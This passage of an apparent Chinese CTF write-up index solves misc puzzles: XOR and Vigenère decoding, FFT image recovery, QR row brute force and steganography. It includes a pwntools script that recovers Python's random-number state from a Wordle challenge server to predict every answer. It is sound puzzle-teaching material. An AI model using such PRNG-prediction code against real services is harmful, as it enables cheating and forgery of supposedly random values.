\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a 0x66 \uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 0x66 \uff1a import struct res = [] with open ( \"msc.enc\" , \"rb\" ) as f : while True : c = f . read ( 1 ) if not c : break res . append ( ord ( c ) ^ 0x66 ) with open ( \"res.bin\" , \"wb\" ) as f : for each in res : f . write ( struct . pack ( \"B\" , each )) \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 FL Keys \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a msc{The_xor_midi_GIFT}","title":"\u7b80\u6613\u52a0\u5bc6"},{"location":"writeups/sysu_msc_puzzle/#_22","text":"\u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 \u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 0.8560967955058971 17.682512473330895 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip \u9898\u76ee\u4ee3\u7801 import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data def fft ( img ): fft = np . fft . fft2 ( img ) fft = np . fft . fftshift ( fft ) m = np . log ( np . abs ( fft )) p = np . angle ( fft ) return m , p if __name__ == '__main__' : img = cv2 . imread ( f 'answer.png' , cv2 . IMREAD_GRAYSCALE ) m , p = fft ( img ) print ( m . min (), m . max ()) new_img1 = mapping ( m ) new_img2 = mapping ( p ) cv2 . imwrite ( f 'cv1.png' , new_img1 ) cv2 . imwrite ( f 'cv2.png' , new_img2 ) \u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data if __name__ == '__main__' : img1 = cv2 . imread ( \"cv1.png\" , cv2 . IMREAD_GRAYSCALE ) img2 = cv2 . imread ( \"cv2.png\" , cv2 . IMREAD_GRAYSCALE ) m = mapping ( img1 , 0.8560967955058971 , 17.682512473330895 ) p = mapping ( img2 , 0 , 2 * np . pi ) res = m * ( np . cos ( p ) + np . sin ( p ) * 1 j ) ishift = np . fft . ifftshift ( res ) iimg = np . fft . ifft2 ( ishift ) iimg = np . abs ( iimg ) iimg = mapping ( iimg ) cv2 . imwrite ( f 'answer.png' , iimg ) flag: msc{The_master_of_cv}","title":"\u56fe\u50cf\u5904\u7406\u5927\u5e08"},{"location":"writeups/sysu_msc_puzzle/#_23","text":"\u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f \u9898\u76ee [ \"10111010111000011000001011101\" , \"00111010110010101000000000010\" , \"11100001101100100001011010110\" , \"10000010000111101111111111101\" , \"10111010000010001000001011101\" , \"01110011010111001001011100001\" , \"10101101110101001110000110010\" , \"10111010111010111110001011101\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"11001010001011011000000001000\" , \"10111010100101100111111110100\" , \"10000010110010110100100011001\" , \"11111110101010101010101111111\" , \"10111010001100010100110110111\" , \"11111110101101010101110110000\" , \"00000000100100100101100011100\" , \"00000000111001101011011111001\" , \"11111100100110010010001011110\" , \"00010001110001001101110001010\" , \"10000010111110001101101000001\" , \"11001110110110010101100100001\" , \"11011110111101111101111110100\" , \"11111110100010100101101011100\" , \"00000000011111011001100000000\" , \"10111010111001000110010100010\" , \"11111110101110011001001111111\" , \"10000010001100011010101000001\" , \"10011111111101000101110010111\" ] \u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a \u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 2*5!*6! = 172800 \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar \u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801 \u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a \u4ee3\u7801 data = [ \"11111110101110011001001111111\" , \"10000010111110001101101000001\" , \"10111010111010111110001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10111010000010001000001011101\" , \"10111010111000011000001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10000010001100011010101000001\" , \"11111110101010101010101111111\" , \"00000000011111011001100000000\" , \"10011111111101000101110010111\" , \"11100001101100100001011010110\" , \"00111010110010101000000000010\" , \"10101101110101001110000110010\" , \"01110011010111001001011100001\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"00000000111001101011011111001\" , \"11001010001011011000000001000\" , \"11111100100110010010001011110\" , \"11001110110110010101100100001\" , \"00010001110001001101110001010\" , \"11011110111101111101111110100\" , \"00000000100100100101100011100\" , \"11111110100010100101101011100\" , \"10000010110010110100100011001\" , \"10111010100101100111111110100\" , \"10111010111001000110010100010\" , \"10111010001100010100110110111\" , \"10000010000111101111111111101\" , \"11111110101101010101110110000\" ] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image , ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [ 9 , 11 , 13 , 15 , 17 , 19 ] shuffle_2 = [ 10 , 12 , 14 , 16 , 18 ] head = data [: 9 ] tail = data [ 20 :] def body ( body_1 , body_2 ): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217 body = [] for i in range ( 5 ): body . append ( body_1 [ i ]) body . append ( body_2 [ i ]) body . append ( body_1 [ 5 ]) return [ data [ i ] for i in body ] def draw_img ( data ): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247 assert len ( data ) == 29 and len ( data [ 0 ]) == 29 img = Image . new ( 'RGB' , ( 31 , 31 ), ( 255 , 255 , 255 )) for i , row in enumerate ( data ): for j , pixel in enumerate ( row ): img . putpixel (( j + 1 , i + 1 ), ( 0 , 0 , 0 ) if pixel == \"1\" else ( 255 , 255 , 255 )) return img with tqdm ( total = 86400 ) as pbar : for body_1 in permutations ( shuffle_1 ): for body_2 in permutations ( shuffle_2 ): im = draw_img ( head + body ( body_1 , body_2 ) + tail ) barcodes = pyzbar . decode ( im ) pbar . update ( 1 ) if ( len ( barcodes ) == 0 ): continue for barcode in barcodes : barcodeData = barcode . data . decode ( \"utf-8\" ) print ( barcodeData ) plt . imshow ( im ) plt . show () \u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a flag\uff1amsc{You_ar3_g0od_4t_QR_Code}","title":"\u6df7\u4e71\u7684\u4e8c\u7ef4\u7801"},{"location":"writeups/tqlctf2022/","text":"TQLCTF 2022 Writeup \u00b6 Abstract \u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88 nano \u7684\u5b98\u65b9 writeup Ranma\u00bd \u00b6 \u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09 \u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd. Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q} \u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract: ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems. The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo. UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values. \u53cd\u63a8\u51fa key\uff1a CODINGWORLD \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a TQLCTF{CODIN6_WOR1D} wordle \u00b6 wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9 \u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684 zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5 \u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca # To prevent the disclosure of answer \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898 \u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a id = random . randrange ( len ( valid_words ) * ( 2 ** 20 )) answer = valid_words [ id % len ( valid_words )] id = ( id // len ( valid_words )) ^ ( id % len ( valid_words )) return hex ( id )[ 2 :] . zfill ( 5 ), answer \u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 id % len(valid_words) \uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 id // len(valid_words) \uff0c\u800c len(valid_words) \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 id \uff0c\u5373 randrange \u7684\u7ed3\u679c \u7206\u7834 random \u4f7f\u7528 tna0y/Python-random-module-cracker \uff0c\u9700\u8981 512 \u4e2a random \u7684\u7ed3\u679c \u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848 \u5b8c\u6574\u4ee3\u7801 import re import sys from pwn import * from tqdm import tqdm from enum import Enum from collections import Counter from randcrack import RandCrack MAX_ATTEMPT = 6 class LetterVerdict ( Enum ): GREEN = 1 YELLOW = 2 GRAY = 3 class AttemptVerdict ( Enum ): WON = 1 LOST = 2 FAILED_ATTEMPT = 3 INVALID_TRY = 4 INVALID_WORD = 5 def get_all_wordle_words (): with open ( \"valid_words.txt\" , \"r\" ) as infile : return [ line . strip () for line in infile . readlines ()] class WordleSolver : def __init__ ( self ): self . __all_possible_words = set ( get_all_wordle_words ()) self . __invalid_letters = set () self . __untried_letters = set () self . __candidate_words = [] self . __green_blocks = set () self . __yellow_blocks = set () self . attempt = 0 self . game_number = - 1 self . tries = [] self . reset () def reset ( self ): self . __invalid_letters . clear () self . __candidate_words = sorted ( list ( self . __all_possible_words )) self . __yellow_blocks . clear () self . __green_blocks . clear () self . attempt = 0 self . __untried_letters = set ( chr ( ord ( 'a' ) + i ) for i in range ( 26 )) self . game_number += 1 self . tries . clear () def __contains_forbidden_letters ( self , word ): for ind , c in enumerate ( word ): if ( c , ind ) not in self . __green_blocks : # here fix a bug in if c in self . __invalid_letters : # the original solver return True return False def __get_untried_letter_probability ( self , words ): counter = Counter () for w in words : for c in w : if c in self . __untried_letters : counter [ c ] += 1 return counter def __get_letter_freq_map ( self , words ): counter = Counter () for w in words : for c in w : counter [ c ] += 1 return counter def __matches_green_constraints ( self , word ): for letter , index in self . __green_blocks : if word [ index ] != letter : return False return True def __matches_yellow_constraints ( self , word ): for letter , index in self . __yellow_blocks : if word [ index ] == letter or letter not in word : return False return True def __filter_out_invalid_words ( self ): new_candidates = [] for word in self . __candidate_words : if self . __contains_forbidden_letters ( word ) or not self . __matches_green_constraints ( word ) or not self . __matches_yellow_constraints ( word ): continue new_candidates . append ( word ) self . __candidate_words = new_candidates def __make_educated_guess ( self ): untried_letters = self . __get_untried_letter_probability ( self . __candidate_words ) freq_map = self . __get_letter_freq_map ( self . __candidate_words ) if len ( untried_letters ) > 1 and self . attempt <= MAX_ATTEMPT - 1 : word_with_score = [] word_list = self . __all_possible_words for word in word_list : letters = set ( word ) untried_score = sum ( untried_letters [ c ] if c in untried_letters else 0 for c in letters ) freq_score = sum ( freq_map [ c ] for c in letters ) word_with_score . append (( word , untried_score , freq_score )) ranked_words = sorted ( word_with_score , key = lambda item : ( - item [ 1 ], - item [ 2 ], item [ 0 ])) guess = ranked_words [ 0 ][ 0 ] else : guess = sorted ( self . __candidate_words , key = lambda word : ( - len ( set ( word )), - sum ( freq_map [ c ] for c in word ), word ) )[ 0 ] return guess def __pick_a_word ( self ): self . __filter_out_invalid_words () if len ( self . __candidate_words ) == 0 : # for debug res = input ( \">>> \" ) return res . strip () elif len ( self . __candidate_words ) == 1 : return self . __candidate_words [ 0 ] return self . __make_educated_guess () def solve ( self , wordle ): last_guess = \"\" wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () while True : self . attempt += 1 guess = self . __pick_a_word () if last_guess == guess : # here fix a bug in the original solver self . __candidate_words . remove ( guess ) guess = self . __pick_a_word () result , letter_verdicts = wordle . guess ( guess ) last_guess = guess self . tries . append ( guess ) if result == AttemptVerdict . WON : return hex_id , guess elif result == AttemptVerdict . LOST : return False elif result == AttemptVerdict . FAILED_ATTEMPT : for chr in guess : self . __untried_letters . discard ( chr ) for i in range ( len ( letter_verdicts )): letter , verdict = letter_verdicts [ i ] if verdict == LetterVerdict . GRAY : flag = True for ( l , _ ) in self . __yellow_blocks : # here fix a bug in if l == letter : # the original solver flag = False break if flag : self . __invalid_letters . add ( letter ) elif verdict == LetterVerdict . GREEN : self . __green_blocks . add (( letter , i )) if ( letter , i ) in self . __yellow_blocks : self . __yellow_blocks . remove (( letter , i )) elif verdict == LetterVerdict . YELLOW : self . __yellow_blocks . add (( letter , i )) else : exit ( 1 ) elif result == AttemptVerdict . INVALID_WORD : self . attempt -= 1 self . __candidate_words . remove ( guess ) self . __all_possible_words . remove ( guess ) class Wordle : def __init__ ( self , mode ): self . p = connect ( \"47.106.102.129\" , 23370 ) self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def restart ( self , mode ): self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def guess ( self , word ): self . p . sendlineafter ( b \"> \" , word . encode ( \"utf-8\" )) status = self . p . recvuntil ( b \"!\" ) if status == b \"Correct!\" : return AttemptVerdict . WON , None result = self . p . recvline () . decode ( \"utf-8\" ) res = re . findall ( r \"\\[4(\\d)m\" , result ) ret = [] for i in range ( 5 ): c = word [ i ] if res [ i ] == \"7\" : ret . append (( c , LetterVerdict . GRAY )) elif res [ i ] == \"3\" : ret . append (( c , LetterVerdict . YELLOW )) else : ret . append (( c , LetterVerdict . GREEN )) attempt_verdict = AttemptVerdict . WON for _ , verdict in ret : if verdict != LetterVerdict . GREEN : attempt_verdict = AttemptVerdict . FAILED_ATTEMPT break return attempt_verdict , ret cracker = RandCrack () wordle = Wordle ( 0 ) solver = WordleSolver () def calc_random_id ( hex_id , word ): valid_words = get_all_wordle_words () length = len ( valid_words ) index = valid_words . index ( word ) # id % len(valid_words) Id = eval ( \"0x\" + hex_id ) tmp = Id ^ index # id // len(valid_words) return tmp * length + index def calc_hex_id_and_word ( random_value ): valid_words = get_all_wordle_words () length = len ( valid_words ) word = valid_words [ random_value % length ] hex_value = ( random_value // length ) ^ ( random_value % length ) return hex ( hex_value )[ 2 :] . zfill ( 5 ), word with tqdm ( total = 624 , desc = \"Cracking random...\" ) as pbar : for i in range ( 512 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) wordle . restart ( 0 ) for i in range ( 112 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) with tqdm ( total = 400 , desc = \"Verifying crack result...\" ) as pbar : for i in range ( 400 ): solver . reset () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) hex_id , answer = solver . solve ( wordle ) if p_hex_id != hex_id : print ( f \"Crack faild: \\n predict: { p_hex_id } , { p_answer } \\n challenge: { hex_id } , { answer } \" ) sys . exit ( 1 ) pbar . update ( 1 ) wordle . p . sendlineafter ( b \"> \" , b \"3\" ) # insane level with tqdm ( total = 512 , desc = \"Solving insane level...\" ) as pbar : for i in range ( 512 ): wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) if hex_id != p_hex_id : print ( f \"Predict failed: \\n predic: { p_hex_id } \\n challenge: { hex_id } \" ) sys . exit ( 1 ) wordle . p . sendlineafter ( b \"> \" , p_answer . encode ( \"utf-8\" )) pbar . update ( 1 ) wordle . p . interactive () the Ohio State University \u00b6 \u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1a https://osu.ppy.sh/beatmapsets/1235288#mania/2568956 \u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c \u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a pwd: VVelcome!! \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a TQLCTF{VVElcOM3 BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a WAVPassword: MisoilePunch \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206 _TO_O$u_i7s_ \u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86 \u5269\u4e0b\u4e00\u90e8\u5206\u662f flag \u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme} \u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme} Nanomaze \u00b6 \u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab \u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e \u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f \u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21 \u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a \u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e \u4ee3\u7801 from pwn import * import pygame from pygame.locals import * p = process ([ \"python\" , \"main.py\" ]) # \u672c\u5730\u590d\u73b0 X , Y = 0 , 0 width = 75 pygame . init () WHITE = ( 255 , 255 , 255 ) GREEN = ( 0 , 255 , 0 ) RED = ( 255 , 0 , 0 ) BLUE = ( 0 , 0 , 255 ) size = width , height = 800 , 1000 clock = pygame . time . Clock () screen = pygame . display . set_mode ( size ) pygame . display . set_caption ( \"nanomaze\" ) screen . fill ( WHITE ) pygame . display . flip () def send ( direction ): res = p . recvuntil ( b \"> \" ) click = False if \"[click]\" in res . decode ( \"utf-8\" ): click = True p . sendline ( direction . encode ( \"utf-8\" )) return click , p . recvline () . decode ( \"utf-8\" ) . strip () def update_value ( direction , value ): global X , Y if direction == \"w\" : X -= value elif direction == \"a\" : Y -= value elif direction == \"s\" : X += value else : Y += value if Y < 0 : Y += 75 def move ( direction , aim = None ): if aim is None : times = 0 while times < 20 : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) return if \"Cannot be moved\" in res : times += 1 else : update_value ( direction , float ( 